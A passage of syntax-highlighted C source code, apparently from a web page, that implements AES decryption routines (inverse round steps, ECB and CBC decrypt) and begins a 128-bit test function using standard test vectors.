</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>]</span> <span class=o>-</span> <span class=n>i</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>uint8_t</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=n>r</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>r</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>r</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>r</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=p>(</span><span class=n>r</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=p>(</span><span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>]</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>uint8_t</span> <span class=n>inv_sub_sbox</span><span class=p>(</span><span class=n>uint8_t</span> <span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>g_inv_sbox</span><span class=p>[</span><span class=n>val</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>inv_sub_bytes</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>inv_sub_sbox</span><span class=p>(</span><span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>inv_mix_columns</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>y</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x0e</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x0d</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span>  <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x0e</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x0d</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x0d</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x0e</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span>  <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x0d</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x0e</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>s</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>r</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>r</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>r</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=p>[</span><span class=n>r</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>s</span><span class=p>[</span><span class=n>r</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>r</span><span class=p>]</span> <span class=o>^</span> <span class=n>aes_mul</span><span class=p>(</span><span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>],</span> <span class=n>y</span><span class=p>[</span><span class=n>r</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>r</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>r</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>r</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>r</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>r</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>aes_decrypt</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>data</span><span class=p>,</span> <span class=nb>int</span> <span class=nb>len</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>w</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>*</span> <span class=mi>15</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=nb>round</span> <span class=n>key</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>s</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=n>state</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>nr</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>key</span> <span class=n>expansion</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>aes_key_expansion</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>w</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>start</span> <span class=n>data</span> <span class=n>cypher</span> <span class=n>loop</span> <span class=n>over</span> <span class=nb>input</span> <span class=n>buffer</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>init</span> <span class=n>state</span> <span class=kn>from</span> <span class=nn>user</span> <span class=n>buffer</span> <span class=p>(</span><span class=n>cyphertext</span><span class=p>)</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>start</span> <span class=n>AES</span> <span class=n>cypher</span> <span class=n>loop</span> <span class=n>over</span> <span class=nb>all</span> <span class=n>AES</span> <span class=n>rounds</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>nr</span> <span class=o>=</span> <span class=n>g_aes_rounds</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>nr</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>nr</span><span class=o>--</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=o>/*</span> <span class=n>do</span> <span class=n>AddRoundKey</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>            <span class=n>aes_add_round_key</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>w</span><span class=p>,</span> <span class=n>nr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>nr</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>nr</span> <span class=o>&lt;</span> <span class=n>g_aes_rounds</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=o>/*</span> <span class=n>do</span> <span class=n>MixColumns</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                    <span class=n>inv_mix_columns</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>/*</span> <span class=n>do</span> <span class=n>ShiftRows</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                <span class=n>inv_shift_rows</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>/*</span> <span class=n>do</span> <span class=n>SubBytes</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                <span class=n>inv_sub_bytes</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>save</span> <span class=n>state</span> <span class=p>(</span><span class=n>cypher</span><span class=p>)</span> <span class=n>to</span> <span class=n>user</span> <span class=n>buffer</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>aes_decrypt_ecb</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>data</span><span class=p>,</span> <span class=nb>int</span> <span class=nb>len</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>aes_decrypt</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=nb>len</span><span class=p>,</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>aes_decrypt_cbc</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>data</span><span class=p>,</span> <span class=nb>int</span> <span class=nb>len</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>key</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>w</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>*</span> <span class=mi>15</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=nb>round</span> <span class=n>key</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>s</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=n>state</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>v</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=n>iv</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>nr</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>key</span> <span class=n>expansion</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>aes_key_expansion</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>w</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>memcpy</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>iv</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>v</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>start</span> <span class=n>data</span> <span class=n>cypher</span> <span class=n>loop</span> <span class=n>over</span> <span class=nb>input</span> <span class=n>buffer</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>init</span> <span class=n>state</span> <span class=kn>from</span> <span class=nn>user</span> <span class=n>buffer</span> <span class=p>(</span><span class=n>cyphertext</span><span class=p>)</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>start</span> <span class=n>AES</span> <span class=n>cypher</span> <span class=n>loop</span> <span class=n>over</span> <span class=nb>all</span> <span class=n>AES</span> <span class=n>rounds</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>nr</span> <span class=o>=</span> <span class=n>g_aes_rounds</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>nr</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>nr</span><span class=o>--</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=o>/*</span> <span class=n>do</span> <span class=n>AddRoundKey</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>            <span class=n>aes_add_round_key</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>w</span><span class=p>,</span> <span class=n>nr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>nr</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>nr</span> <span class=o>&lt;</span> <span class=n>g_aes_rounds</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=o>/*</span> <span class=n>do</span> <span class=n>MixColumns</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                    <span class=n>inv_mix_columns</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>/*</span> <span class=n>do</span> <span class=n>ShiftRows</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                <span class=n>inv_shift_rows</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>/*</span> <span class=n>do</span> <span class=n>SubBytes</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                <span class=n>inv_sub_bytes</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>save</span> <span class=n>state</span> <span class=p>(</span><span class=n>cypher</span><span class=p>)</span> <span class=n>to</span> <span class=n>user</span> <span class=n>buffer</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>uint8_t</span> <span class=n>p</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>^</span> <span class=n>v</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>v</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>aes_cypher_128_test</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=c1>#if 1</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0x99</span><span class=p>,</span> <span class=mh>0xaa</span><span class=p>,</span> <span class=mh>0xbb</span><span class=p>,</span> <span class=mh>0xcc</span><span class=p>,</span> <span class=mh>0xdd</span><span class=p>,</span> <span class=mh>0xee</span><span class=p>,</span> <span class=mh>0xff</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>key</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x0c</span><span class=p>,</span> <span class=mh>0x0d</span><span class=p>,</span> <span class=mh>0x0e</span><span class=p>,</span> <span class=mh>0x0f</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=c1>#else</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0xf6</span><span class=p>,</span> <span class=mh>0xa8</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0x5a</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x8d</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x98</span><span class=p>,</span> <span class=mh>0xa2</span><span class=p>,</span> <span class=mh>0xe0</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x34</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>key</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x7e</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0xae</span><span class=p>,</span> <span class=mh>0xd2</span><span class=p>,</span> <span class=mh>0xa6</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xab</span><span class=p>,</span> <span class=mh>0xf7</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0xcf</span><span class=p>,</span> <span class=mh>0x4f</span><span class=p>,</span> <span class=mh>0x3c</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=c1>#endif</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>aes_encrypt</span><span class=p>(</span><span class=n>AES_CYPHER_128</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>key</span><span class=p>);</span>
